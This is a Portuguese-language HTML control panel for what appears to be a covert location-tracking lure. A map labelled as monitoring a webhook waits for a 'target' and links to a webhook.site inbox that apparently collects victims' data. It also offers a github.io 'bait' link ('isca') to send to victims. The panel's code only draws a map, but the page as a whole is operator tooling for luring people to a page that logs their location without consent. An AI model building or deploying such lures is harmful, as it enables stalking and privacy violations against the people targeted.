<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA INFINITY - PAINEL DE CONTROLE</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #0b141a; color: #25d366; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        #map { height: 60vh; width: 100%; border: 2px solid #25d366; border-radius: 10px; margin-bottom: 15px; }
        .data-panel { background: #121b22; padding: 15px; border: 1px solid #25d366; border-radius: 8px; }
        .label { color: #fff; font-size: 11px; text-transform: uppercase; font-weight: bold; }
        .value { color: #25d366; font-size: 15px; margin-bottom: 8px; }
        .blink { animation: blinker 1.5s linear infinite; color: red; }
        @keyframes blinker { 50% { opacity: 0; } }
        button { background: #25d366; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 14px; }
    </style>
</head>
<body>
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
        <h2 style="margin:0">SISTEMA INFINITY VIRTUAL</h2>
        <span id="status" class="blink">● MONITORANDO WEBHOOK...</span>
    </div>

    <div id="map"></div>

    <div class="data-panel">
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
            <div>
                <div class="label">Status:</div>
                <div class="value">AGUARDANDO ALVO</div>
                <button onclick="window.open('https://webhook.site/#!/8e729126-74a5-4c58-9970-fa2372398e49')">ABRIR MAPA DE CALOR</button>
            </div>
            <div>
                <div class="label">Endereço da Isca:</div>
                <div class="value" style="font-size:11px; color:white;">/conectar.html</div>
                <button onclick="alert('Link da isca: https://bulymist-dot.github.io/Meu.panel-de-acesso/conectar.html')" style="background:#555; color:white;">COPIAR LINK</button>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([-15.78, -47.92], 4);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
    </script>
</body>
</html>
